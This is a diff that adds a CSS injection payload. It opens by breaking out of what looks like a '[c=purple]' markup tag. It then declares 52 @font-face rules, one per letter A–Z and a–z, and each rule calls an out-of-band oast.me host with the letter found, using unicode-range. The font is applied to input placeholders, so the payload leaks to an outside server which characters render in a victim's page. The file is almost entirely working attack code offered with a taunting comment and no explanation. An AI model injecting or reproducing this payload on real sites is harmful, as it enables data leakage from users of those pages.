@@ -1,0 +1,267 @@
+[c=
+purple;}@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:A');
+	unicode-range:U+0041;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:B');
+	unicode-range:U+0042;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:C');
+	unicode-range:U+0043;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:D');
+	unicode-range:U+0044;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:E');
+	unicode-range:U+0045;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:F');
+	unicode-range:U+0046;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:G');
+	unicode-range:U+0047;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:H');
+	unicode-range:U+0048;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:I');
+	unicode-range:U+0049;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:J');
+	unicode-range:U+004A;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:K');
+	unicode-range:U+004B;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:L');
+	unicode-range:U+004C;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:M');
+	unicode-range:U+004D;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:N');
+	unicode-range:U+004E;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:O');
+	unicode-range:U+004F;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:P');
+	unicode-range:U+0050;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:Q');
+	unicode-range:U+0051;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:R');
+	unicode-range:U+0052;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:S');
+	unicode-range:U+0053;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:T');
+	unicode-range:U+0054;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:U');
+	unicode-range:U+0055;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:V');
+	unicode-range:U+0056;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:W');
+	unicode-range:U+0057;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:X');
+	unicode-range:U+0058;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:Y');
+	unicode-range:U+0059;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:Z');
+	unicode-range:U+005A;
+}
+
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:a');
+	unicode-range:U+0061;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:b');
+	unicode-range:U+0062;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:c');
+	unicode-range:U+0063;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:d');
+	unicode-range:U+0064;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:e');
+	unicode-range:U+0065;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:f');
+	unicode-range:U+0066;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:g');
+	unicode-range:U+0067;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:h');
+	unicode-range:U+0068;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:i');
+	unicode-range:U+0069;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:j');
+	unicode-range:U+006A;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:k');
+	unicode-range:U+006B;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:l');
+	unicode-range:U+006C;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:m');
+	unicode-range:U+006D;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:n');
+	unicode-range:U+006E;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:o');
+	unicode-range:U+006F;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:p');
+	unicode-range:U+0070;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:q');
+	unicode-range:U+0071;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:r');
+	unicode-range:U+0072;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:s');
+	unicode-range:U+0073;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:t');
+	unicode-range:U+0074;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:u');
+	unicode-range:U+0075;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:v');
+	unicode-range:U+0076;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:w');
+	unicode-range:U+0077;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:x');
+	unicode-range:U+0078;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:y');
+	unicode-range:U+0079;
+}
+@font-face{
+	font-family:attack;
+	src:url('//cafq7g9mvcprqmidv7s0ckx48ooyyyyyn.oast.me/?Found:z');
+	unicode-range:U+007A;
+}
+
+input::placeholder{
+	font-family:attack;
+}
+#stfu{ smh imagine being bad]
